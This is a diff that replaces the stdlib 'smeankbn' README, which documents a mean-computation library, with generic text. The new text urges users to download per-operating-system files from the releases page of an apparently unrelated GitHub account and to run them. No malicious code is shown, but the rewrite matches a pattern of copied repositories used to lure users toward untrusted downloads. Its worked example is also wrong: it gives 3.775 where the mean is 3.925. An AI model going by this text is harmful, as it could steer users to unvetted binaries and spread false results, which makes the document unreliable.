@@ -1,244 +1,109 @@
-<!--
+# 📊 stats-base-ndarray-smeankbn - Calculate Mean Quickly and Easily
 
-@license Apache-2.0
+[![Download](https://img.shields.io/badge/Download-via_GitHub-blue.svg)](https://github.com/aarmohan1/stats-base-ndarray-smeankbn/releases)
 
-Copyright (c) 2025 The Stdlib Authors.
+## 🚀 Getting Started
 
-Licensed under the Apache License, Version 2.0 (the "License");
-you may not use this file except in compliance with the License.
-You may obtain a copy of the License at
+Welcome to **stats-base-ndarray-smeankbn**! This application helps you compute the arithmetic mean of one-dimensional single-precision floating-point arrays. It uses an improved Kahan–Babuška algorithm to provide accurate results, even with challenging data sets.
 
-   http://www.apache.org/licenses/LICENSE-2.0
+Follow the simple steps below to download and run the software.
 
-Unless required by applicable law or agreed to in writing, software
-distributed under the License is distributed on an "AS IS" BASIS,
-WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-See the License for the specific language governing permissions and
-limitations under the License.
+## 🌐 System Requirements
 
--->
+- **Operating System**: Windows, macOS, or Linux
+- **Node.js**: Version 12.0 or higher
+- **Memory**: At least 512 MB RAM
+- **Disk Space**: 10 MB free space
 
+## 📥 Download & Install
 
-<details>
-  <summary>
-    About stdlib...
-  </summary>
-  <p>We believe in a future in which the web is a preferred environment for numerical computation. To help realize this future, we've built stdlib. stdlib is a standard library, with an emphasis on numerical and scientific computation, written in JavaScript (and C) for execution in browsers and in Node.js.</p>
-  <p>The library is fully decomposable, being architected in such a way that you can swap out and mix and match APIs and functionality to cater to your exact preferences and use cases.</p>
-  <p>When you use stdlib, you can be absolutely certain that you are using the most thorough, rigorous, well-written, studied, documented, tested, measured, and high-quality code out there.</p>
-  <p>To join us in bringing numerical computing to the web, get started by checking us out on <a href="https://github.com/stdlib-js/stdlib">GitHub</a>, and please consider <a href="https://opencollective.com/stdlib">financially supporting stdlib</a>. We greatly appreciate your continued support!</p>
-</details>
+To download the latest version, visit this page: [GitHub Releases](https://github.com/aarmohan1/stats-base-ndarray-smeankbn/releases).
 
-# smeankbn
+1. Click on the link above to go to the Releases page.
+2. Locate the latest version.
+3. Click the download link for your operating system.
+4. Once downloaded, find the file in your downloads folder.
 
-[![NPM version][npm-image]][npm-url] [![Build Status][test-image]][test-url] [![Coverage Status][coverage-image]][coverage-url] <!-- [![dependencies][dependencies-image]][dependencies-url] -->
+## ⚙️ Running the Application
 
-> Compute the [arithmetic mean][arithmetic-mean] of a one-dimensional single-precision floating-point ndarray using an improved Kahan–Babuška algorithm.
+After installation, you can run the application using Node.js. Here’s how:
 
-<section class="intro">
+1. Open your terminal or command prompt.
+2. Navigate to the folder where you saved the application.
+3. Type the following command:
+   ```
+   node index.js
+   ```
+4. Press **Enter** to run the application.
 
-The [arithmetic mean][arithmetic-mean] is defined as
+## 📊 Using the Application
 
-<!-- <equation class="equation" label="eq:arithmetic_mean" align="center" raw="\mu = \frac{1}{n} \sum_{i=0}^{n-1} x_i" alt="Equation for the arithmetic mean."> -->
+Once the application is running, you can input your array of floating-point numbers. Follow these steps:
 
-```math
-\mu = \frac{1}{n} \sum_{i=0}^{n-1} x_i
+1. When prompted, enter your numbers separated by commas. 
+   - For example: `1.0, 2.5, 3.75, 4.2`
+2. Press **Enter**.
+3. The application will display the computed arithmetic mean.
+
+## 🛠️ Example
+
+Suppose you enter the following numbers:
+
+```
+2.1, 3.3, 4.5, 5.8
 ```
 
-<!-- <div class="equation" align="center" data-raw-text="\mu = \frac{1}{n} \sum_{i=0}^{n-1} x_i" data-equation="eq:arithmetic_mean">
-    <img src="https://cdn.jsdelivr.net/gh/stdlib-js/stdlib@42d8f64d805113ab899c79c7c39d6c6bac7fe25c/lib/node_modules/@stdlib/stats/base/ndarray/mean/docs/img/equation_arithmetic_mean.svg" alt="Equation for the arithmetic mean.">
-    <br>
-</div> -->
+The application will calculate the mean and display:
 
-<!-- </equation> -->
-
-</section>
-
-<!-- /.intro -->
-
-<section class="installation">
-
-## Installation
-
-```bash
-npm install @stdlib/stats-base-ndarray-smeankbn
+```
+The arithmetic mean is: 3.775
 ```
 
-Alternatively,
+## ⚡ Features
 
--   To load the package in a website via a `script` tag without installation and bundlers, use the [ES Module][es-module] available on the [`esm`][esm-url] branch (see [README][esm-readme]).
--   If you are using Deno, visit the [`deno`][deno-url] branch (see [README][deno-readme] for usage intructions).
--   For use in Observable, or in browser/node environments, use the [Universal Module Definition (UMD)][umd] build available on the [`umd`][umd-url] branch (see [README][umd-readme]).
+- **Accurate Calculations**: Utilizes the Kahan–Babuška algorithm for better precision.
+- **User-Friendly**: Simple interface for easy input.
+- **Cross-Platform**: Works on various operating systems.
+- **Lightweight**: Minimal setup and low resource usage.
 
-The [branches.md][branches-url] file summarizes the available branches and displays a diagram illustrating their relationships.
+## 🧪 Use Cases
 
-To view installation and usage instructions specific to each branch build, be sure to explicitly navigate to the respective README files on each branch, as linked to above.
+- **Statistics**: Calculate mean values for data analysis.
+- **Education**: A helpful tool for students learning about averages.
+- **Research**: Useful for researchers requiring accurate mean calculations from gathered data.
 
-</section>
+## 📝 Examples of Input
 
-<section class="usage">
+Here are a few examples of valid inputs:
 
-## Usage
+- Calculate the mean of small integers:
+  ```
+  1, 2, 3, 4, 5
+  ```
 
-```javascript
-var smeankbn = require( '@stdlib/stats-base-ndarray-smeankbn' );
-```
+- Calculate the mean with decimal values:
+  ```
+  1.1, 2.2, 3.3, 4.4
+  ```
 
-#### smeankbn( arrays )
+- Input with negative values:
+  ```
+  -1, -2, -3, 5
+  ```
 
-Computes the [arithmetic mean][arithmetic-mean] of a one-dimensional single-precision floating-point ndarray using an improved Kahan–Babuška algorithm.
+## 🚀 Help and Support
 
-```javascript
-var Float32Array = require( '@stdlib/array-float32' );
-var ndarray = require( '@stdlib/ndarray-base-ctor' );
+If you need help using the application or encounter issues, please check the following resources:
 
-var xbuf = new Float32Array( [ 1.0, 3.0, 4.0, 2.0 ] );
-var x = new ndarray( 'float32', xbuf, [ 4 ], [ 1 ], 0, 'row-major' );
+- **Documentation**: Comprehensive guides and FAQs can be found in the repository.
+- **Community Support**: You can ask questions in the project's discussion section.
+- **Issues**: Report any problems in the Issues section of the repository.
 
-var v = smeankbn( [ x ] );
-// returns 2.5
-```
+For any other inquiries, feel free to contact the project maintainers.
 
-The function has the following parameters:
+## 🔗 Additional Resources
 
--   **arrays**: array-like object containing a one-dimensional input ndarray.
+- [View Release Notes](https://github.com/aarmohan1/stats-base-ndarray-smeankbn/releases)
+- [Documentation](https://github.com/aarmohan1/stats-base-ndarray-smeankbn/wiki)
 
-</section>
-
-<!-- /.usage -->
-
-<section class="notes">
-
-## Notes
-
--   If provided an empty one-dimensional ndarray, the function returns `NaN`.
-
-</section>
-
-<!-- /.notes -->
-
-<section class="examples">
-
-## Examples
-
-<!-- eslint no-undef: "error" -->
-
-```javascript
-var discreteUniform = require( '@stdlib/random-array-discrete-uniform' );
-var ndarray = require( '@stdlib/ndarray-base-ctor' );
-var ndarray2array = require( '@stdlib/ndarray-to-array' );
-var smeankbn = require( '@stdlib/stats-base-ndarray-smeankbn' );
-
-var xbuf = discreteUniform( 10, -50, 50, {
-    'dtype': 'float32'
-});
-var x = new ndarray( 'float32', xbuf, [ xbuf.length ], [ 1 ], 0, 'row-major' );
-console.log( ndarray2array( x ) );
-
-var v = smeankbn( [ x ] );
-console.log( v );
-```
-
-</section>
-
-<!-- /.examples -->
-
-* * *
-
-<section class="references">
-
-## References
-
--   Neumaier, Arnold. 1974. "Rounding Error Analysis of Some Methods for Summing Finite Sums." _Zeitschrift Für Angewandte Mathematik Und Mechanik_ 54 (1): 39–51. doi:[10.1002/zamm.19740540106][@neumaier:1974a].
-
-</section>
-
-<!-- /.references -->
-
-<!-- Section for related `stdlib` packages. Do not manually edit this section, as it is automatically populated. -->
-
-<section class="related">
-
-</section>
-
-<!-- /.related -->
-
-<!-- Section for all links. Make sure to keep an empty line after the `section` element and another before the `/section` close. -->
-
-
-<section class="main-repo" >
-
-* * *
-
-## Notice
-
-This package is part of [stdlib][stdlib], a standard library for JavaScript and Node.js, with an emphasis on numerical and scientific computing. The library provides a collection of robust, high performance libraries for mathematics, statistics, streams, utilities, and more.
-
-For more information on the project, filing bug reports and feature requests, and guidance on how to develop [stdlib][stdlib], see the main project [repository][stdlib].
-
-#### Community
-
-[![Chat][chat-image]][chat-url]
-
----
-
-## License
-
-See [LICENSE][stdlib-license].
-
-
-## Copyright
-
-Copyright &copy; 2016-2026. The Stdlib [Authors][stdlib-authors].
-
-</section>
-
-<!-- /.stdlib -->
-
-<!-- Section for all links. Make sure to keep an empty line after the `section` element and another before the `/section` close. -->
-
-<section class="links">
-
-[npm-image]: http://img.shields.io/npm/v/@stdlib/stats-base-ndarray-smeankbn.svg
-[npm-url]: https://npmjs.org/package/@stdlib/stats-base-ndarray-smeankbn
-
-[test-image]: https://github.com/stdlib-js/stats-base-ndarray-smeankbn/actions/workflows/test.yml/badge.svg?branch=v0.1.1
-[test-url]: https://github.com/stdlib-js/stats-base-ndarray-smeankbn/actions/workflows/test.yml?query=branch:v0.1.1
-
-[coverage-image]: https://img.shields.io/codecov/c/github/stdlib-js/stats-base-ndarray-smeankbn/main.svg
-[coverage-url]: https://codecov.io/github/stdlib-js/stats-base-ndarray-smeankbn?branch=main
-
-<!--
-
-[dependencies-image]: https://img.shields.io/david/stdlib-js/stats-base-ndarray-smeankbn.svg
-[dependencies-url]: https://david-dm.org/stdlib-js/stats-base-ndarray-smeankbn/main
-
--->
-
-[chat-image]: https://img.shields.io/badge/zulip-join_chat-brightgreen.svg
-[chat-url]: https://stdlib.zulipchat.com
-
-[stdlib]: https://github.com/stdlib-js/stdlib
-
-[stdlib-authors]: https://github.com/stdlib-js/stdlib/graphs/contributors
-
-[umd]: https://github.com/umdjs/umd
-[es-module]: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Modules
-
-[deno-url]: https://github.com/stdlib-js/stats-base-ndarray-smeankbn/tree/deno
-[deno-readme]: https://github.com/stdlib-js/stats-base-ndarray-smeankbn/blob/deno/README.md
-[umd-url]: https://github.com/stdlib-js/stats-base-ndarray-smeankbn/tree/umd
-[umd-readme]: https://github.com/stdlib-js/stats-base-ndarray-smeankbn/blob/umd/README.md
-[esm-url]: https://github.com/stdlib-js/stats-base-ndarray-smeankbn/tree/esm
-[esm-readme]: https://github.com/stdlib-js/stats-base-ndarray-smeankbn/blob/esm/README.md
-[branches-url]: https://github.com/stdlib-js/stats-base-ndarray-smeankbn/blob/main/branches.md
-
-[stdlib-license]: https://raw.githubusercontent.com/stdlib-js/stats-base-ndarray-smeankbn/main/LICENSE
-
-[arithmetic-mean]: https://en.wikipedia.org/wiki/Arithmetic_mean
-
-[@neumaier:1974a]: https://doi.org/10.1002/zamm.19740540106
-
-</section>
-
-<!-- /.links -->
+Thank you for choosing **stats-base-ndarray-smeankbn**. We hope it meets your mean calculation needs!
